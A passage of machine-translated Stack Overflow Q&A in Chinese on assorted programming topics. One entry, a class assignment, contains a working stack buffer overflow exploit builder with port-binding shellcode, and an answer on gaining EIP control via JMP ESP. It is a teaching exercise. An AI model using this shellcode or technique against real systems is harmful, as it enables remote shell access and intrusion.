以下是损坏的输出的摘录，它应该有韩文字符：

```
 "price":0.00, "version":"2.1.1", "description":"âë°°ë¬ ì¬ê³  í¹ì ì¥ëì£¼ë¬¸ ë°©ì§ë¥¼ ìí´ í´ëí°ì¸ì¦ì ì¤ìí©ëë¤ 
```

此外，我会提到数据被验证为正确，因为相同的数据被写入亚马逊 s3 并且它是正确的（韩文字符在那里是完整的）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-04-30T19:42:12.857

要将 utf8 存储到 mysql，您应该将表列定义为 utf8 字符集，并使用 UTF-8 字符编码创建连接。正如你在这里看到的：

```
 //Load jdbc driver
        Class.forName("com.mysql.jdbc.Driver");

        //Open a connection to server   
        Connection conn = (Connection) DriverManager.getConnection("jdbc:mysql://localhost:3306/test?characterEncoding=UTF-8", USERNAME, PASSWORD);

        //Create statement for query
        Statement stmt = (Statement) conn.createStatement();  

        //create table column with character set utf 8
        stmt.executeUpdate("CREATE TABLE table1 (id int,name varchar(20) character set utf8);");

        //INSERT query
        stmt.executeUpdate("INSERT INTO table1 (id,name) VALUES ('12','汉语')");

        //SELECT query
        ResultSet rs=stmt.executeQuery("SELECT * FROM table1");
        System.out.println(rs.getString("name")); 
```

# python - 将不同的功能应用于组对象中的不同项目：Python pandas

> ID：15262134
> 
> 赞同：10
> 
> 时间：2013-03-07T02:44:56.463
> 
> 标签：python, function, group-by, pandas, apply

假设我有一个如下数据框：

```
In [1]: test_dup_df

Out[1]:
                  exe_price exe_vol flag 
2008-03-13 14:41:07  84.5    200     yes
2008-03-13 14:41:37  85.0    10000   yes
2008-03-13 14:41:38  84.5    69700   yes
2008-03-13 14:41:39  84.5    1200    yes
2008-03-13 14:42:00  84.5    1000    yes
2008-03-13 14:42:08  84.5    300     yes
2008-03-13 14:42:10  84.5    88100   yes
2008-03-13 14:42:10  84.5    11900   yes
2008-03-13 14:42:15  84.5    5000    yes
2008-03-13 14:42:16  84.5    3200    yes 
```

我想一次对重复的数据进行分组，并对and`14:42:10`应用不同的函数（例如，求和并计算 的体积加权平均值）。我知道我能做到`exe_price``exe_vol``exe_vol``exe_price`

```
In [2]: grouped = test_dup_df.groupby(level=0) 
```

对重复的索引进行分组，然后使用`first()`or`last()`函数来获取第一行或最后一行，但这并不是我真正想要的。

有没有办法分组然后将不同的（由我编写的）函数应用于不同列中的值？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-03-07T04:05:53.210

应用您自己的功能：

```
In [12]: def func(x):
             exe_price = (x['exe_price']*x['exe_vol']).sum() / x['exe_vol'].sum()
             exe_vol = x['exe_vol'].sum()
             flag = True        
             return Series([exe_price, exe_vol, flag], index=['exe_price', 'exe_vol', 'flag'])

In [13]: test_dup_df.groupby(test_dup_df.index).apply(func)
Out[13]:
                    exe_price exe_vol  flag
date_time                                  
2008-03-13 14:41:07      84.5     200  True 
2008-03-13 14:41:37        85   10000  True
2008-03-13 14:41:38      84.5   69700  True
2008-03-13 14:41:39      84.5    1200  True
2008-03-13 14:42:00      84.5    1000  True
2008-03-13 14:42:08      84.5     300  True
2008-03-13 14:42:10     20.71  100000  True
2008-03-13 14:42:15      84.5    5000  True
2008-03-13 14:42:16      84.5    3200  True 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-07T03:14:08.147

我喜欢@waitingkuo 的回答，因为它非常清晰易读。

无论如何我都会保留它，因为它看起来确实更快——至少在 Pandas 0.10.0 版中是这样。这种情况[将来可能（希望）发生变化](https://stackoverflow.com/a/10058000/190597)，因此请务必重新运行基准测试，尤其是在您使用不同版本的 Pandas 时。

```
import pandas as pd
import io
import timeit

data = '''\
date time       exe_price    exe_vol flag
2008-03-13 14:41:07  84.5    200     yes
2008-03-13 14:41:37  85.0    10000   yes
2008-03-13 14:41:38  84.5    69700   yes
2008-03-13 14:41:39  84.5    1200    yes
2008-03-13 14:42:00  84.5    1000    yes
2008-03-13 14:42:08  84.5    300     yes
2008-03-13 14:42:10  10    88100   yes
2008-03-13 14:42:10  100    11900   yes
2008-03-13 14:42:15  84.5    5000    yes
2008-03-13 14:42:16  84.5    3200    yes'''

df = pd.read_table(io.BytesIO(data), sep='\s+', parse_dates=[[0, 1]],
                   index_col=0)

def func(subf):
    exe_vol = subf['exe_vol'].sum()
    exe_price = ((subf['exe_price']*subf['exe_vol']).sum()
                 / exe_vol)
    flag = True
    return pd.Series([exe_price, exe_vol, flag],
                     index=['exe_price', 'exe_vol', 'flag'])
    # return exe_price

def using_apply():
    return df.groupby(df.index).apply(func)

def using_helper_column():
    df['weight'] = df['exe_price'] * df['exe_vol']
    grouped = df.groupby(level=0, group_keys=True)
    result = grouped.agg({'weight': 'sum', 'exe_vol': 'sum'})
    result['exe_price'] = result['weight'] / result['exe_vol']
    result['flag'] = True
    result = result.drop(['weight'], axis=1)
    return result

result = using_apply()
print(result)
result = using_helper_column()
print(result)

time_apply = timeit.timeit('m.using_apply()',
                      'import __main__ as m ',
                      number=1000)
time_helper = timeit.timeit('m.using_helper_column()',
                      'import __main__ as m ',
                      number=1000)
print('using_apply: {t}'.format(t = time_apply))
print('using_helper_column: {t}'.format(t = time_helper)) 
```

产量

```
 exe_vol  exe_price  flag
date_time                                    
2008-03-13 14:41:07      200      84.50  True
2008-03-13 14:41:37    10000      85.00  True
2008-03-13 14:41:38    69700      84.50  True
2008-03-13 14:41:39     1200      84.50  True
2008-03-13 14:42:00     1000      84.50  True
2008-03-13 14:42:08      300      84.50  True
2008-03-13 14:42:10   100000      20.71  True
2008-03-13 14:42:15     5000      84.50  True
2008-03-13 14:42:16     3200      84.50  True 
```

时间基准为：

```
using_apply: 3.0081038475
using_helper_column: 1.35300707817 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-07T02:55:56.647

不是很熟悉`pandas`，但在纯 numpy 中你可以这样做：

```
tot_vol = np.sum(grouped['exe_vol'])
avg_price = np.average(grouped['exe_price'], weights=grouped['exe_vol']) 
```

# c++ - 未修复不完整类型的声明转发

> ID：15262135
> 
> 赞同：0
> 
> 时间：2013-03-07T02:45:01.127
> 
> 标签：c++, class, forward-declaration

尽管有许多与此类似的问题，但我无法找到一个可以回答如此简单的问题的问题 - 但是由于数量众多，如果我错过了，您将不得不原谅我。

在以下代码中，会产生以下错误（使用 G++）`'error: field 'CompoundField' has incomplete type'`：

```
class SimpleClass;
class CompoundClass;

class CompoundClass{
    public:
    SimpleClass CompoundField;
};

class SimpleClass{
    public:
    unsigned int SimpleField;
};

int main(){
    CompoundClass obj;
    obj.CompoundField.SimpleField=5;
    return 0;
} 
```

当两个类都被前向声明时，为什么会这样？一个直接的解决方案是在, 或指向`CompoundClass`之后移动 to ，但这无助于解释这里的潜在问题。`SimpleClass``CompoundField``SimpleClass`

更准确地说，其他答案表明这是由于编译器不知道*子*类的大小（即`SimpleClass`），为什么`SimpleClass`可以相对容易地找到大小？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-07T02:51:07.920

编译器看到这个

```
class SimpleClass;
class CompoundClass;

class CompoundClass{
    public:
    SimpleClass CompoundField;
}; 
```

它需要弄清楚 a`CompoundClass`需要多少内存（没有关于`SimpleClass`内存需求的线索）。

因为它不知道要为多少整数、字符串等腾出空间——它举起手来。

但如果你这样做了

```
class SimpleClass;
class CompoundClass;

class CompoundClass{
    public:
    SimpleClass *CompoundField;
}; 
```

然后它会知道 - 只需要一个指针（`void *`就足以应付所有可能的情况！）

# ruby-on-rails - 单独控制器的表单，不显示错误

> ID：15262137
> 
> 赞同：0
> 
> 时间：2013-03-07T02:45:10.643
> 
> 标签：ruby-on-rails

我有一个拥有很多资产的投资组合模型（即资产模型）。

我的投资组合显示视图显示当前用户的投资组合的资产，但它也有一个表单可以快速将资产添加到 current_portfolio。

```
 <%= form_for(@asset) do |f| %>
      <%= hidden_field_tag :portfolio_id, params[:id]%>
      <%= f.text_field :asset_symbol %>
      ... some other fields for cost, shares held, etc
      <%= f.submit "Add Asset to current portfolio"%>
 <%end%> 
```

添加资产工作正常。此外，将符号字段留空将阻止添加资产。但是，当我提交表单时，错误并没有出现。

我有`validates :asset_symbol, presence: true`我的模型，我知道它没有保存。问题是错误没有传递到我的投资组合显示视图。就好像资产错误在资产控制器和投资组合显示视图之间消失了一样。

显示视图有以下应该显示错误

```
 <% if @asset.errors.any? %>
      <% @asset.errors.full_messages.each do |msg| %>
          <li> <%= msg %> </li>
      <% end %>
  <%end%> 
```

@asset 将我的投资组合控制器定义为`Asset.new`

资产控制人：

```
def create
    @asset = Asset.new(params[:asset])
    @asset.portfolio_id = params[:portfolio_id]
    @asset.save
    redirect_to portfolio_path(params[:portfolio_id])
end 
```

我究竟做错了什么？

请注意，如果我要`render 'portfolios/show'`显示错误，但随后我遇到了我现在在链接上`/assets`而不是在链接上的问题`/portfolio/show/1`。这很重要，因为我的资产控制器中没有相同的变量，`Create`也因为我无法引用`:id`in `/assets`，而我可以在 in 中做一些事情`/portfolio/show/1`。因此我不认为渲染是一个解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T07:15:42.387

```
 def create  
    @asset = Asset.new(params[:asset])
    @portfolio = Portfolio.find(params[:portfolio_id])
    @asset.portfolio_id = params[:portfolio_id]
    respond_to do |format|    
      if @asset.save
        format.html { redirect_to portfolio_path(params[:portfolio_id]) }
      else
       format.html { render :action => "show", :controller => "portfolio?" }
      end
    end
  end 
```

# asp.net-mvc-3 - MVC 3 后台处理的优缺点

> ID：15262140
> 
> 赞同：1
> 
> 时间：2013-03-07T02:45:16.920
> 
> 标签：asp.net-mvc-3, task-parallel-library, backgroundworker

我需要在 MVC 3 应用程序中进行一些音频处理，并且想知道这些不同背景方法的优缺点。作为一般规则，音频处理将是一个长时间运行的过程，所以我只想确保 IIS 可以自由处理其他请求。

1.  AsyncController & 后台工作者

    ```
    public ActionResult GetAudioCompleted(byte[] audio)
    {
    return File(audio, "audio/wav", "mywavfile.wav");
    }

    public void GetAudioAsync()
    {          
        BackgroundWorker w = new BackgroundWorker();
        w.RunWorkerCompleted += (s, e) =>
        {
            AsyncManager.Parameters["audio"] = e.Result;
            AsyncManager.OutstandingOperations.Decrement();
        };
        w.DoWork += (s, e) =>
        {      
            byte[] b;       
            using (var ms = new MemoryStream())
            {
                // Process audio to memory stream

                ms.Seek(0, SeekOrigin.Begin);
                b = new byte[ms.Length];
                ms.Read(b, 0, (int)ms.Length);
                e.Result = b;
            }
        };
        AsyncManager.OutstandingOperations.Increment();
        w.RunWorkerAsync();            
    } 
    ```

2.  异步控制器和任务

    ```
    public ActionResult GetAudioCompleted(byte[] audio)
    {
        return File(audio, "audio/wav", "mywavfile.wav");
    }

    public void GetAudioAsync()
    {            
        AsyncManager.OutstandingOperations.Increment();
        var t = Task<byte[]>.Factory.StartNew(() =>
        {
            byte[] b;
            using (var ms = new MemoryStream())
            {
                // Process audio to memory stream
                ms.Seek(0, SeekOrigin.Begin);
                b = new byte[ms.Length];
                ms.Read(b, 0, (int)ms.Length);
            }
            return b;
        })
        .ContinueWith(c =>
            {
                AsyncManager.Parameters["audio"] = c.Result;
                AsyncManager.OutstandingOperations.Decrement();
            });          
    } 
    ```

3.  非异步控制器和线程

    ```
    public ActionResult GetaAudio()
    {
        byte[] b;

        using (var ms = new MemoryStream())
        {
            var t = Thread(() =>
                {
                    // Process audio to memory stream
                });
            t.Start();
            t.Join();

            // error checking etc.
            ms.Seek(0, SeekOrigin.Begin);
            b = new byte[ms.Length];
            ms.Read(b, 0, (int)ms.Length);
            return File(b, "audio/wav", "mywavfile.wav");
        }
    } 
    ```

问题：

1.  是否推荐将 BackgroundWorkers 用于 Web 应用程序？
2.  如果我使用任务，这个后台线程是否使用 IIS 线程池中的一个（可能会否定这种方法的好处之一，因为线程没有被释放用于请求处理）？
3.  使用 System.Threading.Thread - 此线程是否使用 IIS 线程池中的一个。t.Join() 会阻塞当前的 IIS 线程吗？

哪种方法对您来说似乎更好，为什么？欢迎任何其他方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T03:03:23.433

1.  不会。ASP.NET 和 IIS 在自己的线程上执行每个 HTTP 请求/响应。ASP.NET 中的异步编程更多的是为每个请求做更多的工作（例如在单独的线程上执行不相关的 SQL 查询），而不是处理线程化请求。

2.  我不知道，我对Tasks不太熟悉。

3.  是的，是的。

我会这样做（伪代码）：

1.  我会处理文件，然后在后台线程中处理它（使用简单的`System.Threading.Thread`实例），这意味着 IIS 请求/响应线程不会被阻止并且可以立即将 HTML 返回给客户端。
2.  我会在某处存储此文件处理作业的令牌或引用。然后我会将 303 重定向返回到“/processingJobs/job123”（其中 job123 是作业 ID）。
3.  actionHandler for`GET processingJobs`将查找作业 123 的后台线程并查看它是否已完成，如果未完成，则返回 HTML 响应“正在处理您的作业，请再次刷新页面以获取更新状态”，以及每 5-10 秒刷新一次页面的小 javascript。
4.  如果作业完成，则返回已处理的带有`content-disposition:`标题的音频文件。

如果音频处理由单独的进程或队列系统处理，而不是同时处理所有这些，则这种技术可以很好地扩展，甚至可以无限扩展。

一般准则：如果无法在 100 毫秒内完成 HTTP 请求/响应，则在后台执行工作并立即返回状态消息。

# jquery - jQuery datepicker 导致错误

> ID：15262141
> 
> 赞同：0
> 
> 时间：2013-03-07T02:45:18.473
> 
> 标签：jquery, asp.net, jquery-plugins, user-controls, jquery-ui-datepicker

我正在为 datepick 使用 jQuery 插件（[http://keith-wood.name/datepick.html](http://keith-wood.name/datepick.html)）

```
 <link rel="stylesheet" type="text/css" href="Styles/jquery.datepick.css"/>
 <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script type="text/javascript" src="Scripts/jquery.datepick.js"></script>

     <script type="text/javascript">

         $(function () {
             $(".mydatepicker").datepick({ dateFormat: 'dd/mm/yyyy' });
         }); 
```

并继续遇到这个问题：

```
<script type="text/javascript">
//<![CDATA[
if (typeof(Sys) === 'undefined') throw new Error('ASP.NET Ajax client-side framework failed to load.');
//]]>
</script> 
```

当我尝试从该页面导出 CSV 文件中的一些数据时。

有任何想法吗？！

我从搜索中尝试了许多解决方案（例如在 web.config 中更新），但没有任何效果。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T03:01:03.483

`Sys`客户端中的是`asp:ScriptManager`.

所以`asp:ScriptManager`在使用 Sys 之前包括 , 以消除您的错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T05:30:05.623

我不明白你为什么用这个

```
<script type="text/javascript">
//<![CDATA[
if (typeof(Sys) === 'undefined') 
        throw new Error('ASP.NET Ajax client-side framework failed to load.');
//]]>
</script> 
```

这在您使用`scriptmanager`到您的应用程序时使用。
你`update panels`在你的网页中使用吗？
如果不删除行。

脚本管理器详细信息
[http://msdn.microsoft.com/en-us/magazine/cc163354.aspx](http://msdn.microsoft.com/en-us/magazine/cc163354.aspx)

# java - 计算剩余时间？

> ID：15262142
> 
> 赞同：0
> 
> 时间：2013-03-07T02:45:27.190
> 
> 标签：java

我有一个时间是这样产生的：

```
SimpleDateFormat dateFormatUCT = new SimpleDateFormat("yyyy-MM-dd HH:mm");
dateFormatUCT.setTimeZone(TimeZone.getTimeZone("UCT"));

String deadline = dateFormatUCT.format(new Date()); 
```

我现在把它作为一个叫做截止日期的字符串。我想稍后再次获取当前日期时间并比较截止日期是否已过。如果它没有通过，我想计算还剩多少时间。考虑到数据现在是字符串，是否有一种好的内置方法可以做到这一点？

TIA

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-07T02:49:04.797

您可以使用您创建的*相同*`parse`日期格式的方法将字符串表示形式转换回日期：

 *```
Date deadlineDate = dateFormatUCT.parse(deadline); 
```

要比较另一个日期（例如`currentDate`）是否已超过截止日期，只需执行以下操作：

```
if(currentDate.after(deadlineDate)) {
    // deadline has passed, do something
} 
```

要获得它们之间的时间差（以毫秒为单位），这样做就足够了：

```
long timeDiff = currentDate.getTime() - deadlineDate.getTime(); 
```

您可以使用`TimeUnit`该类的方法将此毫秒值转换为其他单位（如天、分钟、秒等）：

```
TimeUnit.SECONDS.toSeconds(timeDiff); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T02:53:02.950

比较两个 Date 实例的最佳方法是以毫秒为单位使用它的值。要获得价值只是做..

```
Date d = new Date();
long time1 = d.getTime(); 
```

..稍后您可以执行与上述相同的操作并获得以毫秒为单位的时间差。如果你将它除以 1000，得到秒，再除以 60 得到分钟，依此类推。

谢谢！

@leo。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T03:05:18.747

我想你应该看看[Joda time](http://joda-time.sourceforge.net/)。它是对标准 Java Date API 的增强，比 Calendar API 更轻巧。

它还有一些专门用于持续时间量的类，例如[Joda Duration](http://joda-time.sourceforge.net/apidocs/org/joda/time/Duration.html)。

我希望它有帮助..*

# linux - 需要帮助找出远程缓冲区溢出

> ID：15262145
> 
> 赞同：3
> 
> 时间：2013-03-07T02:45:33.897
> 
> 标签：linux, security, buffer-overflow

是为了课堂作业。我有点卡住了，我只有一些问题可以帮助我继续前进。（对我来说不要作弊：p）我认为本科班的残酷作业......

我们应该做的：

数控 compName.cs.myschool.edu 9050

如果我们键入一些内容然后按 Ctrl+D，就会有服务器在监听/回显。我们需要使用该输入来破解服务器程序并创建一个具有 sudo 权限的帐户。

以下是相关代码：

```
int main(int argc, char const *argv[])
{
    char input[1000];
    int sockfd, newsockfd, portno, clilen, val = 1;
    struct sockaddr_in serv_addr, cli_addr;

    // some server code that I don't understand but probably isn't super relevant

    dup2(newsockfd, 0);   // bind stdin
    dup2(newsockfd, 1);   // bind stdout
    dup2(newsockfd, 2);   // bind stderr

    bufferCopy( input, 0x1000, stdin );
    printf("You entered: %s\n", input );        

    close(newsockfd);
    close(sockfd);
    return 0;
}

void bufferCopy( char * input, int inputLen, FILE * file )
{
    int i = 0;
    int c = 0;
    while( (c = fgetc( file )) != EOF  &&  i < inputLen - 2 )
    {
        input[i++] = c;
    }
    input[i] = 0;    
} 
```

**更新：** 我知道我需要做什么：

*   无操作雪橇（一堆 0x90）
*   其次是端口绑定shellcode（来自书）
*   后面跟着返回地址（“输入”变量的地址）重复了一堆

**更新：** 我在做什么：

*   我使用以下代码编写文件。
*   猫攻击代码 | 数控 compName.cs.myschool.edu 9090

    ```
    static const int  NUM_NOPS = 800;
    static const char NOP = 0x90;
    static const int  NUM_ADDRESSES = 800;

    static char nopSled[800];
    char shellcode[] = { // on port 31334 == 0x7a66
        "\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80"
        "\x96\x6a\x66\x58\x43\x52\x66\x68\x7a\x66\x66\x53\x89\xe1\x6a\x10"
        "\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80"
        "\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f"
        "\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62"
        "\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"
    };
    static const char returnAddress[] = {0xbf, 0xff, 0xf4, 0x40};

    int i=0;
    for(i=0; i < NUM_NOPS; i++){
        nopSled[i] = NOP;
    }

    FILE * pFile;
    pFile = fopen("attackCode", "w");
    fwrite( nopSled, 1, sizeof(nopSled), pFile );   
    fwrite( shellcode, 1, 92, pFile );
    for(i=0; i < NUM_ADDRESSES; i++ ){
        fwrite( returnAddress, 1, 4, pFile );
    }
    fclose(pFile); 
    ```

**更新：** 我不明白的是：

*   返回指针在内存中的位置......我怎样才能找到这个？
*   ^ 因此无操作部分需要多长时间，或者重复返回地址的次数
*   “输入”的地址是什么——从 printf(%p) 和 gdb 获取不同的值
*   为什么我什么都没有发生……如果我写了很多无操作等，甚至没有段错误。

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-13T20:08:39.327

通常，您将执行以下步骤：

1.  用于可利用缓冲区的模糊测试。
2.  弄清楚如何控制 EIP。
3.  弄清楚如何访问你的 shellcode。

至于第一点，您已经找到了触发溢出的方法（基本上是任何大于 1000 字节的输入值）。

由于堆栈上的缓冲区溢出会覆盖缓冲区地址以下的数据，并且由于`input`是在函数帧中的堆栈上分配的，因此缓冲区的`main`某些部分将覆盖`main`调用的返回地址。要找出覆盖 EIP 的部分，您可以使用[metasploit 的*pattern_create*和*pattern_offset*工具](https://github.com/rapid7/metasploit-framework/tree/master/tools)。

现在棘手的部分可能是找到一种有效修改 EIP 以跳转到您的 shellcode 的方法。使用这样的缓冲区：

```
AA…AA BBBB CC…CC 
```

返回时的堆栈`main`如下所示：

```
 ⋮
0x41414141
0x41414141
0x42424242 <= ESP
0x43434343
0x43434343
     ⋮ 
```

由于 return 将 EIP 设置为堆栈顶部的值（此处`BBBB`）并通过减少堆栈指针来降低堆栈，因此 a`JMP ESP`将直接跳转到您的 shellcode 之前`BBBB`：

```
 ⋮
0x41414141
0x41414141
0x42424242 
0x43434343 <= ESP,EIP
0x43434343
     ⋮ 
```

要查找`JMP ESP`指令，请查看加载的模块/库并在 gdb 中检查它们：

```
find /b <from addr>, <to addr>, 0xff, 0xe4 
```

找到`JMP ESP`可用于覆盖堆栈上的返回地址的地址以跳转到您的 shellcode。

# zend-framework2 - Zf2 表网关

> ID：15262150
> 
> 赞同：1
> 
> 时间：2013-03-07T02:46:08.623
> 
> 标签：zend-framework2, tablegateway

需要帮助了解为什么不使用 ServiceManager 就无法查询我的数据库，或者可能是我做错了什么。可能不推荐我的方法，但您的回答将帮助我更好地理解框架。

我的模型如下：

```
namespace Album\Model;

use Zend\Db\TableGateway\TableGateway;
use Zend\Db\Adapter\Adapter;

class AlbumTable
{
    public function getAll()
    {
        $configArray = ['driver' => 'Pdo_Mysql', 'database' => 'zf2tutorial', 'username' => 'root'];
        $adapter = new Adapter($configArray);
        $tableGateway = new TableGateway('Album', $adapter);
        $resultSet = $tableGateway->select();
        return $resultSet;
    }
} 
```

我的控制器：

```
namespace Album\Controller;

use Zend\Mvc\Controller\AbstractActionController;
use Zend\View\Model\ViewModel;
use Album\Model\AlbumTable;

class AlbumController extends AbstractActionController
{
    public function indexAction()
    {
        $rowset = new AlbumTable();
        $rowset->getAll();
        return new Viewmodel(array(
            'rows' => $rowset
        ));
    }
} 
```

对应的查看文件：

```
var_dump($this->rows) 
// outputs: object(Album\Model\AlbumTable)[250]. 
```

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T09:22:48.780

您传入的是 AlbumTable 对象，而不是返回 ResultSet 的 getAll() 的结果。

```
$rows = $rowset->getAll();
return new Viewmodel(array(
    'rows' => $rows
)); 
```

# java - netbeans 中这段代码中的适当事件是什么？

> ID：15262151
> 
> 赞同：0
> 
> 时间：2013-03-07T02:46:09.900
> 
> 标签：java, swing

我有一个内部框架，但每次激活任何内部框架时，组合框中的值都会在下拉列表中重复，如何防止这种情况发生？

实际上我的问题是当其他内部框架被激活时，组合框开始复制

```
private void formInternalFrameActivated(javax.swing.event.InternalFrameEvent evt) {   

try
  {
     Class.forName("sun.jdbc.odbc.JdbcOdbcDriver");
     Connection con= DriverManager.getConnection("jdbc:odbc:ref","sa","niit@123");
     Statement st1=con.createStatement();
     ResultSet rs1=st1.executeQuery("select opid from patient");
     while(rs1.next())
     {
        opid_combo.addItem(rs1.getString(1));
     }}

     catch(Exception e)
     {
        System.out.println(e);
     } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T03:29:48.453

> 我的问题是当其他内部框架被激活时，组合框开始复制

不要在`internalFrameActivated`事件中加载数据。而是使用`internalFrameOpened`事件，它应该只在第一次完成。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-07T02:52:14.113

您应该在重新加载它们之前清除组合框值...

```
private void formInternalFrameActivated(javax.swing.event.InternalFrameEvent evt) {
    // Remove items first
    opid_combo.removeAllItems()
    try
    {
        Class.forName("sun.jdbc.odbc.JdbcOdbcDriver");
        Connection con= DriverManager.getConnection("jdbc:odbc:ref","sa","niit@123");
        Statement st1=con.createStatement();
        ResultSet rs1=st1.executeQuery("select opid from patient");
        while(rs1.next())
        {
            opid_combo.addItem(rs1.getString(1));
        }
    }
    catch(Exception e)
    {
        System.out.println(e);
    }
} 
```

**挑剔**

当我在这里的时候。每次激活框架时重新加载项目可能不是一个好主意。如果您需要在某个时间重新加载组合框，您可能应该提供“刷新”选项。

此外，在 Event Dispatching Thread 的上下文中执行此操作也不是一个好主意，因为它会使您的应用程序在每次切换帧时“暂停”。相反，使用类似 a 的东西[`SwingWorker`](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/worker.html)在后台加载值

# mvel - 如何在 MVEL for / foreach 循环中中断或继续

> ID：15262152
> 
> 赞同：6
> 
> 时间：2013-03-07T02:46:27.683
> 
> 标签：mvel

我看到 MVEL 支持 for 循环和 foreach 模板，但是如何从循环中“中断”或“继续”？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-22T04:23:01.293

文档中没有提到对“中断”或“继续”的支持：http: [//mvel.codehaus.org/MVEL+2.0+Control+Flow](http://mvel.codehaus.org/MVEL+2.0+Control+Flow)。

我能找到的最接近的是 2009 年的用户组电子邮件，指出不支持中断或继续： http: [//markmail.org/message/rgyqvwhiedfpcchj](http://markmail.org/message/rgyqvwhiedfpcchj)

你仍然可以通过这种方式达到与“break”相同的效果（不是世界上最干净的代码）：

```
skip_rest = false;
for(item: collection) {
   if (!skip_rest) {
     /* do something */
     if (some condition) {
       /* break by skipping */
       skip_rest = true; 
     }
   }
} 
```

你明白了，类似的事情可以通过标志设置来实现“继续”。

# arrays - 将数组传递给 PowerShell 脚本

> ID：15262153
> 
> 赞同：5
> 
> 时间：2013-03-07T02:46:42.453
> 
> 标签：arrays, powershell, param

我正在尝试将数组传递给 PowerShell 脚本，但我总是只得到一个值。我已经用谷歌搜索了我的屁股，但我找不到任何东西。我需要做的就是将一个数组传递给脚本。这是我的代码：

```
param($Location)
($location).count

Foreach ($loc in $Location)
{

$loc

} 
```

这是我正在运行的命令：

```
C:\Windows\System32\WindowsPowerShell\v1.0\PowerShell.exe -ExecutionPolicy Unrestricted  -File "C:\ParaTestingArray.ps1" -location Sydney,London 
```

这是输出：

> 1
> 悉尼

对于我的生活，我无法获取数组中的其他值。我试过使用

```
param([string[]]$Location) 
```

我试过了：

```
-location "Sydney","London"
-location @(Sydney,London)
-location Sydney London
-location Sydney,London
-location (Sydney,London) 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-07T06:45:48.137

请`-command`改用开关。

像这样：

```
powershell -Command "&{C:\ParaTestingArray.ps1 -Location A,B,C}" 
```

从 about_powershell：

要编写运行 Windows PowerShell 命令的字符串，请使用以下格式：

```
 "& {<command>}" 
```

其中引号表示字符串，调用运算符 ( `&`) 导致命令被执行。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T02:56:03.573

我无法重现该结果：

```
$script = @'
param($Location)
($location).count

Foreach ($loc in $Location)
{

$loc

}
'@

$script | sc test.ps1

.\test.ps1 sydney,london 
```

2 悉尼 伦敦

编辑：这有效：

```
$args.count

Foreach ($loc in $args)
{

$loc

} 
```

称为：powershell.exe -file c:\test.ps1 sydney london

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-11-07T23:21:01.073

这

```
Powershell.exe -Command "&{C:\script.ps1 -ParmArray 1,2,3}" 
```

把戏对我有用——但不幸的是感觉很老套。在我剩下的 powershell 经验之后，这绝对是违反直觉的。

# matlab - 在matlab中绘制一个循环的结果

> ID：15262163
> 
> 赞同：1
> 
> 时间：2013-03-07T02:48:26.900
> 
> 标签：matlab, loops, plot

我有一个关于在 Matlab 中绘制循环结果的问题。这是代码。

```
for t=0:1:10;
  VS=3*exp(-t/3)*sin(pi*t);
  if VS>0
     VL=VS
  else VL=0

  end

end

plot(t,VL)
xlabel('Time(s)')
ylabel('Across Voltage(V)')
title('Across Voltage Vs Time') 
```

我想根据上述表达式中的电压与从 0 到 10 的时间绘制一个图。但是，在运行代码后，该图仍然没有显示任何内容。谁能帮我弄清楚为什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T02:53:31.940

这是因为您在`for`循环之外进行绘图。所以当时 t 不是你期望的向量，它是一个标量值`t=10`。此外，`VL`取决于执行。所以你应该形成`t`一个向量并执行以下操作：

```
k=0;
for t=0:1:10;
k=k+1;
  VS=3*exp(-t/3)*sin(pi*t);
  if VS>0
    VL(k,1)=VS
  else VL(k,1)=0
  end
end
plot(0:10,VL)
xlabel('Time(s)')
ylabel('Across Voltage(V)')
title('Across Voltage Vs Time') 
```

# gwt - 为 gwt-openlayers 和 openstreetmap 设置缩放级别

> ID：15262167
> 
> 赞同：0
> 
> 时间：2013-03-07T02:48:51.837
> 
> 标签：gwt, openstreetmap, gwt-openlayers

我正在尝试使缩放级别栏显示与我的离线缓存相同数量的缩放级别，并且使用 gwt-openlayers 非常困难。

我试过没有成功：

```
osmOptions.getJSObject().setProperty(
    "minZoomLevel", 5);
osmOptions.getJSObject().setProperty(
    "maxZoomLevel", 11); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T02:51:41.537

下面的方法现在对我有用：

```
/**
 * @param options
 * @param minZoomLevel the minimum for this is 3 for open streetmap
 * @param maxZoomLevel
 */
private static void setZoomLevelRange(LayerOptions options,
    int minZoomLevel, int maxZoomLevel) {
    options.getJSObject().setProperty("zoomOffset", minZoomLevel);

    int len = maxZoomLevel - minZoomLevel + 1;
    double[] resolutions = new double[len];
